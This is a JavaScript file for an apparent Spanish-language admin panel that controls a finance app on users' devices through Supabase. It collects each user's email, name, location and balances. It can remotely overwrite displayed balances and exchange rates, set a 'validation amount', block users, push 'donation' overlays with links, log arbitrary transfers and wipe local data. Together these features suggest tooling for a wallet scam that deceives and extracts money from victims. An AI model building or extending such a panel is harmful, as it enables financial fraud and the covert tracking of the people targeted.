  const preset = BLOCK_PRESETS[type] || BLOCK_PRESETS.general;
  if (!message) {
    message = preset.message;
  }
  const payload = {
    active: true,
    type,
    message,
    title: preset.label,
    accent: preset.accent
  };
  const success = await dispatchCommand('set-block', payload, { type });
  if (success && elements.inputs.blockMessage) {
    elements.inputs.blockMessage.value = '';
  }
}

function buildOverlayPayload(template, overrides) {
  const base = OVERLAY_TEMPLATES[template] || {};
  const payload = {
    title: overrides.title || base.title || 'Aviso importante',
    message: overrides.message || base.message || '',
    accent: overrides.accent || base.accent || '#38bdf8',
    template
  };
  const buttonLabel = overrides.buttonLabel || base.button?.label || '';
  const buttonUrl = overrides.buttonUrl || base.button?.href || '';
  if (buttonLabel || buttonUrl) {
    payload.button = {
      label: buttonLabel || 'Ver detalles',
      href: buttonUrl || '#'
    };
  }
  return payload;
}

async function handleOverlay(event) {
  event.preventDefault();
  if (!state.selectedId) {
    showToast('Selecciona un usuario para mostrar el overlay.', 'warning');
    return;
  }
  const template = elements.inputs.overlayTemplate ? elements.inputs.overlayTemplate.value : 'donation';
  const payload = buildOverlayPayload(template, {
    title: elements.inputs.overlayTitle ? elements.inputs.overlayTitle.value.trim() : '',
    message: elements.inputs.overlayMessage ? elements.inputs.overlayMessage.value.trim() : '',
    accent: elements.inputs.overlayAccent ? elements.inputs.overlayAccent.value.trim() : '',
    buttonLabel: elements.inputs.overlayButtonLabel ? elements.inputs.overlayButtonLabel.value.trim() : '',
    buttonUrl: elements.inputs.overlayButtonUrl ? elements.inputs.overlayButtonUrl.value.trim() : ''
  });
  const success = await dispatchCommand('show-overlay', payload, { template });
  if (success && elements.inputs.overlayTitle) {
    elements.inputs.overlayTitle.value = '';
    elements.inputs.overlayMessage.value = '';
    elements.inputs.overlayAccent.value = '';
    elements.inputs.overlayButtonLabel.value = '';
    elements.inputs.overlayButtonUrl.value = '';
  }
}

async function handleSendFunds(event) {
  event.preventDefault();
  const snapshot = state.selectedId ? state.snapshotMap.get(state.selectedId) : null;
  if (!snapshot) {
    showToast('Selecciona un usuario para registrar la transferencia.', 'warning');
    return;
  }
  const direction = elements.inputs.transferDirection ? elements.inputs.transferDirection.value : 'send';
  const email = elements.inputs.transferEmail ? elements.inputs.transferEmail.value.trim().toLowerCase() : '';
  if (!email) {
    showToast('Ingresa el correo de la contraparte.', 'warning');
    return;
  }
  const amount = elements.inputs.transferAmount ? parseNumericInput(elements.inputs.transferAmount.value) : null;
  if (!Number.isFinite(amount) || amount <= 0) {
    showToast('El monto debe ser mayor a cero.', 'warning');
    return;
  }
  const currency = elements.inputs.transferCurrency ? elements.inputs.transferCurrency.value.toLowerCase() : 'usd';
  const note = elements.inputs.transferNote ? elements.inputs.transferNote.value.trim() : '';
  const referenceRaw = elements.inputs.transferReference ? elements.inputs.transferReference.value.trim() : '';
  const sanitizedReference = referenceRaw ? referenceRaw.replace(/[^A-Za-z0-9\-_.]/g, '').slice(0, 32) : '';
  const transferId = sanitizedReference && sanitizedReference.length >= 3
    ? sanitizedReference
    : `remote-${Date.now().toString(16)}`;
  const counterpartyName = inferNameFromEmail(email);
  const createdAt = new Date().toISOString();
  const payload = {
    transferId,
    direction: direction === 'receive' ? 'receive' : 'send',
    amount,
    currency,
    note,
    counterpartyEmail: email,
    counterpartyName,
    reference: sanitizedReference || undefined,
    createdAt
  };
  const meta = { action: payload.direction, target: email, reference: sanitizedReference || null };
  const success = await dispatchCommand('send-funds', payload, meta);
  if (success) {
    if (elements.inputs.transferAmount) elements.inputs.transferAmount.value = '';
    if (elements.inputs.transferNote) elements.inputs.transferNote.value = '';
    if (elements.inputs.transferReference) elements.inputs.transferReference.value = '';
  }
}

function fillBalanceFromSnapshot() {
  const snapshot = state.selectedId ? state.snapshotMap.get(state.selectedId) : null;
  if (!snapshot) {
    showToast('Selecciona un usuario para copiar el saldo.', 'warning');
    return;
  }
  const balance = snapshot.balance || {};
  if (elements.inputs.balanceUsd) {
    elements.inputs.balanceUsd.value = Number.isFinite(balance.usd) ? formatNumber(balance.usd) : '';
  }
  if (elements.inputs.balanceBs) {
    elements.inputs.balanceBs.value = Number.isFinite(balance.bs) ? formatNumber(balance.bs) : '';
  }
  if (elements.inputs.balanceEur) {
    elements.inputs.balanceEur.value = Number.isFinite(balance.eur) ? formatNumber(balance.eur) : '';
  }
  if (elements.inputs.balanceUsdt) {
    elements.inputs.balanceUsdt.value = Number.isFinite(balance.usdt) ? formatNumber(balance.usdt) : '';
  }
  showToast('Saldo del snapshot copiado en el formulario.', 'success');
}

async function clearRateValues() {
  if (!state.selectedId) {
    showToast('Selecciona un usuario para limpiar la tasa.', 'warning');
    return;
  }
  const key = elements.inputs.rateKey ? elements.inputs.rateKey.value : 'bcv';
  await dispatchCommand('update-rate', { key, value: null, usdToEur: null, label: RATE_LABELS[key] || key }, { action: 'clear-rate' });
}

async function clearValidationAmount() {
  if (!state.selectedId) {
    showToast('Selecciona un usuario para limpiar la validación.', 'warning');
    return;
  }
  await dispatchCommand('set-validation-amount', { amount: null }, { action: 'clear' });
}

async function clearBlockState() {
  if (!state.selectedId) {
    showToast('Selecciona un usuario para desbloquear.', 'warning');
    return;
  }
  await dispatchCommand('set-block', { active: false }, { type: 'clear' });
}

async function hideOverlay() {
  if (!state.selectedId) {
    showToast('Selecciona un usuario para ocultar el overlay.', 'warning');
    return;
  }
  await dispatchCommand('hide-overlay', {}, { action: 'hide' });
}

async function wipeAccount() {
  if (!state.selectedId) {
    showToast('Selecciona un usuario antes de borrar los datos locales.', 'warning');
    return;
  }
  const confirmed = window.confirm('¿Seguro que deseas eliminar todos los datos locales del usuario seleccionado?');
  if (!confirmed) return;
  await dispatchCommand('wipe-account', {}, { action: 'wipe' });
}

async function dispatchCommand(type, payload = {}, meta = {}) {
  if (!state.client) {
    showToast('Supabase no está inicializado.', 'error');
    return false;
  }
  const snapshot = state.selectedId ? state.snapshotMap.get(state.selectedId) : null;
  if (!snapshot) {
    showToast('Selecciona un usuario antes de enviar comandos.', 'warning');
    return false;
  }
  const commandId = `admin-${Date.now().toString(16)}-${Math.random().toString(16).slice(2, 8)}`;
  const createdAt = new Date().toISOString();
  const issuedBy = state.operatorName || (elements.operatorInput ? elements.operatorInput.value.trim() : '');
  const metaPayload = Object.assign(
    {
      source: 'admin-panel',
      issuedAt: createdAt,
      issuedBy: issuedBy || undefined,
      context: 'miinformacion-admin'
    },
    meta || {}
  );
  const record = {
    command_id: commandId,
    type,
    payload,
    meta: metaPayload,
    created_at: createdAt,
    source: 'admin-panel',
    device_id: snapshot.deviceId || null,
    email: snapshot.email || null,
    full_name: snapshot.profile?.fullName || snapshot.fullName || null
  };
  try {
    const { data, error } = await state.client
      .from(TABLES.commands)
      .insert(record)
      .select()
      .single();
    if (error) throw error;
    const normalized = normalizeCommand(data);
    if (normalized) {
      addCommand(normalized);
    }
    showToast('Comando enviado correctamente.', 'success');
    return true;
  } catch (error) {
    console.error('[AdminMiInformacion] Error enviando comando:', error);
    showToast(`Error enviando comando: ${error.message || error}`, 'error');
    return false;
  }
}

function addSnapshot(snapshot) {
  if (!snapshot) return;
  state.rawSnapshots = state.rawSnapshots.filter((item) => item.id !== snapshot.id);
  state.rawSnapshots.unshift(snapshot);
  if (state.rawSnapshots.length > MAX_RECORDS) {
    state.rawSnapshots.length = MAX_RECORDS;
  }
  rebuildSnapshotIndex();
  updateMetrics();
  if (state.selectedId === snapshot.identifier) {
    renderDetail();
  }
}

function addCommand(command) {
  if (!command) return;
  state.commands = state.commands.filter((item) => item.id !== command.id);
  state.commands.unshift(command);
  if (state.commands.length > MAX_RECORDS) {
    state.commands.length = MAX_RECORDS;
  }
  updateMetrics();
  if (state.selectedId) {
    const snapshot = state.snapshotMap.get(state.selectedId);
    if (snapshot) {
      renderDetailHistory(snapshot);
      updateDetailStatus(snapshot);
    }
  }
}

async function fetchSnapshots() {
  if (!state.client) return;
  state.loadingSnapshots = true;
  try {
    const { data, error } = await state.client
      .from(TABLES.snapshots)
      .select('id, collected_at, device_id, email, full_name, location, last_sync_at, data')
      .order('collected_at', { ascending: false })
      .limit(MAX_RECORDS);
    if (error) throw error;
    const normalized = (data || []).map(normalizeSnapshot).filter(Boolean);
    state.rawSnapshots = normalized;
    rebuildSnapshotIndex();
  } catch (error) {
    console.error('[AdminMiInformacion] Error obteniendo snapshots:', error);
    showToast(`Error obteniendo snapshots: ${error.message || error}`, 'error');
  } finally {
    state.loadingSnapshots = false;
    updateMetrics();
  }
}

async function fetchCommands() {
  if (!state.client) return;
  state.loadingCommands = true;
  try {
    const { data, error } = await state.client
      .from(TABLES.commands)
      .select('id, command_id, type, payload, meta, created_at, email, device_id, source')
      .order('created_at', { ascending: false })
      .limit(MAX_RECORDS);
    if (error) throw error;
    state.commands = (data || []).map(normalizeCommand).filter(Boolean);
    updateMetrics();
    if (state.selectedId) {
      const snapshot = state.snapshotMap.get(state.selectedId);
      if (snapshot) {
        renderDetailHistory(snapshot);
        updateDetailStatus(snapshot);
      }
    }
  } catch (error) {
    console.error('[AdminMiInformacion] Error obteniendo comandos:', error);
    showToast(`Error obteniendo comandos: ${error.message || error}`, 'error');
  } finally {
    state.loadingCommands = false;
  }
}

async function refreshAll() {
  if (!state.client) {
    await connectSupabase();
  }
  if (!state.client) return;
  if (elements.refreshButton) {
    elements.refreshButton.disabled = true;
  }
  setSupabaseStatus('warning', 'Actualizando datos', 'Consultando snapshots y comandos en Supabase…');
  await Promise.all([fetchSnapshots(), fetchCommands()]);
  setSupabaseStatus('online', 'Conectado a Supabase', `Última actualización · ${formatRelativeTime(new Date())}`);
  if (elements.refreshButton) {
    elements.refreshButton.disabled = false;
  }
}

async function connectSupabase() {
  if (state.client) return state.client;
  setSupabaseStatus('warning', 'Inicializando', 'Preparando cliente de Supabase…');
  try {
    const config = Object.assign({}, DEFAULT_SUPABASE_CONFIG, window.miInformacionAdminConfig || {});
    state.client = createClient(config.url, config.anonKey, { auth: { persistSession: false } });
    setSupabaseStatus('online', 'Conectado a Supabase', 'Cliente inicializado correctamente');
    subscribeRealtime();
    return state.client;
  } catch (error) {
    console.error('[AdminMiInformacion] Error inicializando Supabase:', error);
    setSupabaseStatus('offline', 'Error de conexión', error.message || 'No se pudo crear el cliente.');
    showToast('No se pudo conectar con Supabase.', 'error');
    return null;
  }
}

function subscribeRealtime() {
  if (!state.client || !state.client.channel) return;
  if (state.realtimeChannel) {
    state.realtimeChannel.unsubscribe();
  }
  const channel = state.client
    .channel('miinformacion-admin')
    .on(
      'postgres_changes',
      { event: 'INSERT', schema: 'public', table: TABLES.snapshots },
      (payload) => {
        const snapshot = normalizeSnapshot(payload.new);
        if (snapshot) {
          addSnapshot(snapshot);
          showToast('Nuevo snapshot recibido.', 'info');
        }
      }
    )
    .on(
      'postgres_changes',
      { event: 'INSERT', schema: 'public', table: TABLES.commands },
      (payload) => {
        const command = normalizeCommand(payload.new);
        if (command) {
          addCommand(command);
        }
      }
    )
    .subscribe((status) => {
      if (status === 'SUBSCRIBED') {
        setSupabaseStatus('online', 'Conectado a Supabase', 'Escuchando cambios en tiempo real');
      } else if (status === 'CHANNEL_ERROR') {
        setSupabaseStatus('warning', 'Canal inestable', 'Reintentando suscripción en tiempo real…');
      }
    });
  state.realtimeChannel = channel;
}

function restoreOperatorName() {
  if (!elements.operatorInput) return;
  try {
    const stored = localStorage.getItem(STORAGE_OPERATOR_KEY);
    if (stored) {
      elements.operatorInput.value = stored;
      state.operatorName = stored.trim();
    }
  } catch (error) {
    console.warn('[AdminMiInformacion] No se pudo leer el operador almacenado.', error);
  }
  elements.operatorInput.addEventListener('input', () => {
    const value = elements.operatorInput ? elements.operatorInput.value.trim() : '';
    state.operatorName = value;
    try {
      localStorage.setItem(STORAGE_OPERATOR_KEY, value);
    } catch (error) {
      console.warn('[AdminMiInformacion] No se pudo guardar el operador.', error);
    }
  });
}

function attachEventListeners() {
  if (elements.userList) {
    elements.userList.addEventListener('click', (event) => {
      const item = event.target.closest('.user-list__item');
      if (item && item.dataset.identifier) {
        selectSnapshot(item.dataset.identifier);
      }
    });
    elements.userList.addEventListener('keydown', (event) => {
      if (event.key === 'Enter' || event.key === ' ') {
        const item = event.target.closest('.user-list__item');
        if (item && item.dataset.identifier) {
          event.preventDefault();
          selectSnapshot(item.dataset.identifier);
        }
      }
    });
  }

  if (elements.searchInput) {
    elements.searchInput.addEventListener('input', (event) => {
      state.filterText = event.target.value || '';
      applyFilters();
    });
  }

  if (elements.filterSelect) {
    elements.filterSelect.addEventListener('change', (event) => {
      state.filterStatus = event.target.value || 'all';
      applyFilters();
    });
  }

  if (elements.refreshButton) {
    elements.refreshButton.addEventListener('click', () => {
      refreshAll();
    });
  }

  if (elements.forms.updateBalance) {
    elements.forms.updateBalance.addEventListener('submit', handleUpdateBalance);
  }
  if (elements.forms.updateRate) {
    elements.forms.updateRate.addEventListener('submit', handleUpdateRate);
  }
  if (elements.forms.validation) {
    elements.forms.validation.addEventListener('submit', handleValidationAmount);
  }
  if (elements.forms.block) {
    elements.forms.block.addEventListener('submit', handleBlock);
  }
  if (elements.forms.overlay) {
    elements.forms.overlay.addEventListener('submit', handleOverlay);
  }
  if (elements.forms.sendFunds) {
    elements.forms.sendFunds.addEventListener('submit', handleSendFunds);
  }

  if (elements.buttons.fillBalance) {
    elements.buttons.fillBalance.addEventListener('click', fillBalanceFromSnapshot);
  }
  if (elements.buttons.clearRate) {
    elements.buttons.clearRate.addEventListener('click', clearRateValues);
  }
  if (elements.buttons.clearValidation) {
    elements.buttons.clearValidation.addEventListener('click', clearValidationAmount);
  }
  if (elements.buttons.clearBlock) {
    elements.buttons.clearBlock.addEventListener('click', clearBlockState);
  }
  if (elements.buttons.hideOverlay) {
    elements.buttons.hideOverlay.addEventListener('click', hideOverlay);
  }
  if (elements.buttons.wipeAccount) {
    elements.buttons.wipeAccount.addEventListener('click', wipeAccount);
  }
}

async function init() {
  restoreOperatorName();
  attachEventListeners();
  await connectSupabase();
  await refreshAll();
}

init().catch((error) => {
  console.error('[AdminMiInformacion] Error inicializando panel:', error);
  showToast('Ocurrió un error al iniciar el panel.', 'error');
});

